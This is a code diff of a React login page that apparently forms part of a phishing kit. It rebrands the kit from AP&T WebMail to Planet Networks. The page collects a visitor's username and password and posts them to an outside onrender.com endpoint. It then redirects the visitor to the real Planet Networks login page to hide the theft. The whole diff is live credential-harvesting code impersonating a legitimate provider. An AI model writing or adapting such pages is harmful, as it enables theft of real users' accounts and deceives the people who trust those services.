@@ -9,7 +9,7 @@ import logo from './logo.png';
 import google from './google.png';
 import rounde from './round.png';
 import aptlogo from './apt_logo.png';
-
+import planet from './planet.png';
 
 
 
@@ -19,7 +19,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("APT")
+    const[platform, setPlatform] = useState("Planet")
 
     const[showError, setShowError] = useState(false);
 
@@ -30,7 +30,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+        const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -42,7 +42,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            window.location.href = 'https://webmail.aptalaska.net/';
+            window.location.href = 'https://fibersmith-planetnetworks.us.auth0.com/login?state=hKFo2SBlTzBYeFQ1N2lLNUZ4c1dGZ3M3SG9mdXlHQ2FvUVhBRqFupWxvZ2luo3RpZNkgN2xLNF9LcDV2V25CYVloMEV4elU0STNVSlhLc3BwWDWjY2lk2SB4R2FUWUsybUtaQVhsVVd1UU9QRDRoY0dWUTF5VUpiVw&client=xGaTYK2mKZAXlUWuQOPD4hcGVQ1yUJbW&protocol=oauth2&response_type=token%20id_token&redirect_uri=https%3A%2F%2Fmy.planet.net%2Fcallback&scope=openid%20profile%20token%20token_id&audience=https%3A%2F%2Fplanetnetworksportalapi.fibersmith.systems%2F&nonce=AKpL3AS8.AYERmXfcgFUV44fd_Bf80wi&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4yMy4zIn0%3D';
         }
       } catch (error) {
         // Handle error
@@ -66,9 +66,9 @@ async function handleSubmit(e){
 
 
 
-            <div className='col-md-5 whitediv m-auto py-3 px-4'>
-                <div className='text-left'>
-                <img className='logoimage' src={aptlogo} />
+            <div className='col-md-3 whitediv m-auto'>
+                <div className='imagediv py-4 px-0 text-center'>
+                <img className='logoimage' src={planet} />
 
                 </div>
 
@@ -76,31 +76,40 @@ async function handleSubmit(e){
 
                 <form onSubmit={handleSubmit}>
 
-                <div class="form-group row mt-4">
-    <label for="staticEmail" class="col-sm-2 col-form-label label">Username</label>
-    <div class="col-sm-10">
-      <input onChange={function(e){
-        setUserName(e.target.value);
-      }} value={email} type="text" class="form-control" id="staticEmail" />
+     
+
+    
+  <div class="input-group  px-3">
+    <div class="input-group-prepend mt-2">
+      <div class="input-group-text"><i className='fa fa-user icons'></i></div>
     </div>
-  </div>
-  <div class="form-group row">
-    <label for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
-    <div class="col-sm-10">
-      <input onChange={function(e){
-        setPassword(e.target.value);
-      }} value={password} type="password" class="form-control" id="inputPassword"/>
-    </div>
+    <input onChange={function(e){
+      setUserName(e.target.value);
+    }}value={email} type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="username/email"required/>
   </div>
 
 
- 
 
+  <div class="input-group  px-3 mt-2">
+    <div class="input-group-prepend mt-2">
+      <div class="input-group-text"><i className='fa fa-lock icons'></i></div>
+    </div>
+    <input onChange={function(e){
+      setPassword(e.target.value);
+    }}value={password} type="password" class="form-control" id="inlineFormInputGroupUsername2" placeholder="your password"required/>
+  </div>
+
+
+<div className='text-center py-4'>
+<a className='forgot'>Don't remember your password?</a>
+
+</div>
+    
        
                    
                  <div className='form-group text-center'>
 
-                        <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>
+                        <button type='submit' className='btn btn-rounded-bottom mybutton '>{'LOG IN >'}</button>
 
                     </div>
 
@@ -109,7 +118,7 @@ async function handleSubmit(e){
             </div>
 
 
-            <p className='info mt-5'>AP&T WebMail  ●  Get support</p>
+          
         
         </>
     );
